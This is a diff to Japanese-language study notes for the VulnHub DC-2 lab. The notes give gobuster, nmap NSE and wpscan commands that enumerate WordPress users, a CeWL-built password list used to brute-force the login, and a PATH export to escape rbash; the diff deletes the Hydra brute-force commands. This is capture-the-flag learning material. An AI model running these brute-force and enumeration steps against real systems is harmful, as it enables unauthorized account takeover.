@@ -23,29 +23,26 @@
   2. 1人でログイン
   3. 別名でログイン
 
-### (参考)curlコマンドでリダイレクトページを扱う
-- `curl -I $IP`
-  - `-I`ヘッダ情報のみを取得 
+
 
 ### gobuster
-- `gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt`
-  - `$URL`の代わりに`$IP`でもOK 
+- `gobuster dir -b 403,404 -u $URL -w /usr/share/wordlists/dirb/common.txt -x php -t 50`
+  - `$URL`の代わりに`$IP`でもOK
+  - `-b` statusの403,404は表示しない 
+  - `-x` 拡張子がphpも探す
+  - `-t` スレッド数を50に増やす。デフォルトは10
 - `/wp-admin`があることがわかる
 
 ### ブラウザでチェックしてみる
 - 先ほど取得した`/wp-admin`ディレクトリでサイトにアクセスしてみるとwordPressのダッシュボードの認証ページに飛ぶことがわかる。HTMLのコードを見ると、`/wp-login.php`にpostしているのがわかる
+- wordpressが使われているので、できるだけ専用のwpscanコマンドを使った方が効率的である
 - それ以上は特にわからない
-
-### wig
-- `wig $URL`
-- wordPressのバージョンやOSのバージョンがわかる
-- `/wp-login.php`があるのがわかる
-- それ以上は特にわからない
-
 
 ### Nmap NSE
 - nmap nseはnmapのスキャンを利用して、同時にスクリプトを実行できる。ここではwordPressのユーザを見つけることができる。
-- `nmap -p80 --script http-wordpress-users 192.168.56.104`
+- nmapスクリプトで使えるのを探す。次ので検索すると出てくる
+  - `cat /usr/share/nmap/scripts/script.db | grep wordpress | grep user` 
+- `nmap -p80 --script http-wordpress-users dc-2`
   - `-p80`はなくてもいい 
 - userが3人であることがわかる
 - users.txtを作る
@@ -58,47 +55,24 @@
 - http-wordpress-usersのスクリプト(プログラム)は`/usr/share/nmap/scripts`
 - (補足)wpscanでもできる cf690
 
-### (補足)wpscan
-- `wpscan --url $IP --enumerate u,vt,vp`
-  - `-vt` vulun title
-  - `-vp` vuln plugin
+
 
 ### CewL
 - CewLは指定したWEBサイトをスクレイピングして、キーワードを辞書ファイルとして生成するツール
-- Cewl install cf471
-  - `/vulnhub/` 　フォルダに移動する
-  - `git clone https://github.com/digininja/CeWL`
-  - `cd CeWL`
-  - `sudo gem install bundler`
-  - `bundle install`
-  - `chmod u+x ./cewl.rb`
-- `./cewl.rb dc-2 -w ../cewl.txt`
+- `cewl dc-2 -w cewl.txt`
   - パスが通っていないのでCewlフォルダに入って実行する
   - dc-2は/etc/hostsで設定したIPアドレスで、そこの対象のサイトをスクレイピングする
   - -wはファイルの書き込みを指定していて、ここでは一つ上のフォルダに指定している。
   - 絶対パスで作ったフォルダに入れてもいい。実はこっちの方がいい `-w ~/vulnhub/dc2/cewl.txt`
-### (参考)cewlのオプション
-- `./cewl.rb dc-2 -d 3 -m 5 -w ../cewl.txt`
-  - `-d` ディレクトリの深さを指定できる。デフォルトは2
-  - `-m` 文字の最低の数を指定できる。例えばパスワードが5文字以上なら5とかに指定すればいい
 
-### Hydra
-- ダッシュボードの認証をhydraで突破する
-- `hydra -L users.txt -P cewl.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
-  - `S=Location`のところは`incorrect`でもいい
-  - `'~'`の中はコロンで3つに分かれていて、1つ目はアドレス、２つ目はブラウザのinspect->network->Postをクリック->request->RawをOnにして、そこからコピペして`^USER^`と`^PASS^`とこを書き換える、コピペしたら、上のhydraのコードと異なるが大丈夫。３つ目はS=Locationになっているがよくわからん。おそらくdc2にリダイレクトさせているので、何かあると思う
-  - -L:ユーザリストを指定, -l:特定のユーザを指定
-  - -P:パスワードリストを指定, -p:特定のパスワードを指定
-  - logとpwdはwp-login.phpのソースコードを見るとわかる
-
-### (別解)Hydraでssh
-- wordpressでなく、sshのパスワードを直接探しているだけ
-- `hydra -l tom -P cewl.txt ssh://$IP:7744`
-
-### (別解)wpscan
-- `wpscan --url http://dc-2 --disable-tls-checks -U users.txt -P cewl.txt`
+### wpscan
+- `wpscan --url http://dc-2  -U users.txt -P cewl.txt`
 - または、こっちだとユーザネームもやってくるれる
 - `wpscan --url http://dc-2 --passwords cewl.txt`
+
+
+
+
 ### 認証情報
 - 結果２人の情報がわかる
 
@@ -143,10 +117,10 @@
 - 制限のあるrbashから通常のshのシェルになっている。ただし、`su`コマンドは使えないのでjerryにはユーザを変えれない
 
 ### 環境変数を設定する
-  - 通常のコマンドが使えるようにPATHを追加する
-  - `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin/:/usr/bin:/sbin:/bin`
-  - 確認する `echo $PATH`
-  - ちなみに、suコマンドは/binにあるので、これだけでもいい。またこの時点でLinpeas.shは取得できる
+- 通常のコマンドが使えるようにPATHを追加する
+- `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin/:/usr/bin:/sbin:/bin`
+- 確認する `echo $PATH`
+- ちなみに、suコマンドは/binにあるので、これだけでもいい。またこの時点でLinpeas.shは取得できる
 
 ### ユーザでsshする
 - 複数の候補があった時に一番ルートが取れそうな権限の強いユーザの利用を目指す
